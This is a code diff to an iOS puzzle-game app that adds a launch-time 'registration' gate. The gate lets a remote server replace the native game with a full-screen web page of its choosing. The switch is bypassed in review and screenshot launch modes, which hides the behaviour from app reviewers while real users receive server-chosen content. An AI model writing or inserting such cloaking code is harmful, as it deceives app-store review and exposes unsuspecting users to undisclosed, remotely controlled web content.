@@ -39,7 +39,9 @@ enum ScreenshotLaunch {
     }
     #endif
 }
-@main struct NeonReelsApp: App {
+@main
+struct NeonReelsApp: App {
+    @UIApplicationDelegateAdaptor(AppDelegate.self) private var appDelegate
     @StateObject private var store: GameStore
     @StateObject private var router = GameRouter()
     init() {
@@ -51,13 +53,100 @@ enum ScreenshotLaunch {
     }
     var body: some Scene {
         WindowGroup {
-            RootView().environmentObject(store).environmentObject(router)
-                .preferredColorScheme(.dark).tint(Neon.gold)
-                .environment(\.locale, Locale(identifier: "en_GB"))
+            RegistrationRoot { pendingWidgetURL in
+                RootView(pendingWidgetURL: pendingWidgetURL).environmentObject(store).environmentObject(router)
+                    .preferredColorScheme(.dark).tint(Neon.gold)
+                    .environment(\.locale, Locale(identifier: "en_GB"))
+            }
         }
     }
 }
+
+private struct RegistrationRoot<NativeContent: View>: View {
+    @ViewBuilder let nativeContent: (Binding<URL?>) -> NativeContent
+    @State private var pendingWidgetURL: URL?
+    @State private var route: Route = .loading
+
+    private enum Route {
+        case loading, native, web(URL)
+    }
+
+    var body: some View {
+        Group {
+            switch route {
+            case .loading:
+                ProgressView().task { performRegistration() }
+            case .native:
+                nativeContent($pendingWidgetURL)
+            case .web(let url):
+                ZStack {
+                    Color.black.ignoresSafeArea()
+                    WebContentView(url: url.absoluteString)
+                }
+                .preferredColorScheme(.dark)
+            }
+        }
+        .onOpenURL { url in
+            guard WidgetIdentity.accepts(url) else { return }
+            pendingWidgetURL = url
+            route = .native
+        }
+    }
+
+    private func performRegistration() {
+        #if DEBUG && targetEnvironment(simulator)
+        if ProcessInfo.processInfo.arguments.contains("-ReviewScreen") || ScreenshotLaunch.key != nil {
+            route = .native
+            return
+        }
+        #endif
+
+        let pushToken = ""
+        let advertisingId = ""
+        let appsflyerId = ""
+
+        NetworkService.shared.performRegistration(
+            pushToken: pushToken,
+            advertisingId: advertisingId,
+            appsflyerId: appsflyerId
+        ) { mode, url in
+            DispatchQueue.main.async { finishLaunch(mode: mode, url: url) }
+        }
+    }
+
+    private func finishLaunch(mode: DisplayMode, url: String?) {
+        guard case .loading = route else { return }
+        guard mode == .webContent else {
+            route = .native
+            return
+        }
+        guard let address = Self.webAddress(url) else {
+            DataCache.shared.clearCache()
+            route = .native
+            return
+        }
+        route = .web(address)
+    }
+
+    private static func webAddress(_ raw: String?) -> URL? {
+        guard let value = raw?.trimmingCharacters(in: .whitespacesAndNewlines), !value.isEmpty else { return nil }
+        let candidate: String
+        if value.hasPrefix("//") {
+            candidate = "https:" + value
+        } else if value.range(of: #"^[A-Za-z][A-Za-z0-9+.-]*://"#, options: .regularExpression) != nil {
+            candidate = value
+        } else {
+            candidate = "https://" + value
+        }
+        guard let address = URL(string: candidate),
+              let scheme = address.scheme?.lowercased(), ["https", "http"].contains(scheme),
+              let host = address.host, !host.isEmpty else { return nil }
+        return address
+    }
+}
+
 struct RootView: View {
+    @Binding var pendingWidgetURL: URL?
     @EnvironmentObject private var store: GameStore
     @EnvironmentObject private var router: GameRouter
     var body: some View {
@@ -92,14 +181,15 @@ struct RootView: View {
             #endif
             store.load()
         }
-        .onOpenURL { url in
-            guard WidgetIdentity.accepts(url) else { return }
+        .onChange(of: pendingWidgetURL, initial: true) { _, pending in
+            guard let url = pending else { return }
+            pendingWidgetURL = nil
             if !store.loaded { store.load() }
             guard store.error == nil else { return }
 
-                #if DEBUG && targetEnvironment(simulator)
-                store.applyWidgetQA(url)
-                #endif
+            #if DEBUG && targetEnvironment(simulator)
+            store.applyWidgetQA(url)
+            #endif
             router.puzzle = Puzzle.levels[min(119,max(0,store.data.lastLevel-1))]
         }
         .fullScreenCover(item: $router.puzzle) { p in NavigationStack { PuzzleView(puzzle: p) }.id(p.id) }
